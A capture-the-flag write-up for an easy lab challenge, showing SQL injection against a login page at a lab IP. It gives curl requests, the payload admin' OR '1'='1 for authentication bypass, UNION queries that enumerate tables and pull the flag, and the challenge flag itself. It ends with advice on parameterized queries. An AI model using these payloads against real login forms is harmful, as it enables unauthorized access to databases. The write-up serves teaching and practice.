# Day 1: The Grinch's Web Exploitation

**Category:** Web Security  
**Difficulty:** Easy  
**Year:** 2025  
**Type:** Normal Day Quest

## Challenge Description

The Grinch has been up to no good this holiday season! He's created a vulnerable web application and hidden a flag somewhere. Your task is to find and exploit the vulnerability to retrieve the flag. The application appears to be a simple login page with some hidden functionality.

![Challenge Interface](https://images.unsplash.com/photo-1551288049-bebda4e38f71?w=800&h=600&fit=crop)
*Caption: The vulnerable login page showing the initial challenge interface*

The challenge involves a web application with a login form that appears to be vulnerable to SQL injection. The goal is to bypass authentication and extract the hidden flag from the database.

## Files and Resources

- [Exploit Script](https://github.com/Farhan-25/CTF-Scripts/blob/main/aoc2025_day1_exploit.py) - Python script for automated SQL injection
- [Burp Suite Project](https://www.dropbox.com/s/example/burp_aoc_day1.zip) - Burp Suite project with captured requests

## Solution

### Step 1: Initial Reconnaissance

First, I examined the login page to understand its structure and identify potential vulnerabilities.

```bash
# Using curl to test the login endpoint
curl -X POST http://10.10.10.10/login \
  -d "username=admin&password=test" \
  -v
```

![Initial Request](https://images.unsplash.com/photo-1461749280684-dccba630e2f6?w=800&h=600&fit=crop)
*Caption: Testing the login endpoint with a basic request*

The response indicated that the application was processing the login, but returned an "Invalid credentials" message. This suggested the application was vulnerable to SQL injection.

### Step 2: SQL Injection Testing

I tested for SQL injection vulnerabilities using common payloads:

```bash
# Testing for SQL injection
curl -X POST http://10.10.10.10/login \
  -d "username=admin' OR '1'='1&password=anything"
```

![SQL Injection Test](https://images.unsplash.com/photo-1550751827-4bd374c3f58b?w=800&h=600&fit=crop)
*Caption: Testing SQL injection payload in the username field*

The application returned a success message, confirming the SQL injection vulnerability. The payload `admin' OR '1'='1` successfully bypassed the authentication.

### Step 3: Database Enumeration

After successfully bypassing authentication, I used UNION-based SQL injection to enumerate the database structure:

```sql
' UNION SELECT table_name FROM information_schema.tables WHERE table_schema = database()--
```

![Database Enumeration](https://images.unsplash.com/photo-1558494949-ef010cbdcc31?w=800&h=600&fit=crop)
*Caption: Extracting table names from the database*

I discovered a table named `flags` which likely contained the challenge flag.

### Step 4: Flag Extraction

Finally, I extracted the flag from the `flags` table:

```sql
' UNION SELECT flag FROM flags WHERE id=1--
```

![Flag Extraction](https://images.unsplash.com/photo-1516321318423-f06f85b504dc?w=800&h=600&fit=crop)
*Caption: Successfully extracted the flag from the database*

## Flag

```
THM{gr1nch_sql_1nj3ct10n_2025}
```

## Screenshots

> **Note:** You can place images inline within any step (as shown above) or group them here at the end. Use relative paths like `./images/screenshot1.png` or absolute URLs.

![Login Page](https://images.unsplash.com/photo-1551288049-bebda4e38f71?w=800&h=600&fit=crop)
*Caption: The initial login page of the vulnerable application*

![Successful Exploitation](https://images.unsplash.com/photo-1516321318423-f06f85b504dc?w=800&h=600&fit=crop)
*Caption: Successfully bypassed authentication and extracted the flag*

## Tools Used

- `curl` - Command-line tool for testing HTTP requests
- `Burp Suite` - Web application security testing tool
- `sqlmap` - Automated SQL injection tool (for verification)
- `Browser DevTools` - For inspecting network requests

## References

- [OWASP SQL Injection Guide](https://owasp.org/www-community/attacks/SQL_Injection) - Comprehensive guide on SQL injection attacks
- [PortSwigger SQL Injection](https://portswigger.net/web-security/sql-injection) - Interactive SQL injection tutorial
- [SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) - Quick reference for SQL injection payloads

## Notes

This challenge was a great introduction to web security and SQL injection. The key takeaway was understanding how improper input validation can lead to serious security vulnerabilities. Always use parameterized queries or prepared statements when interacting with databases to prevent SQL injection attacks.

An alternative approach would be to use `sqlmap` for automated exploitation, but manual testing helps understand the vulnerability better.

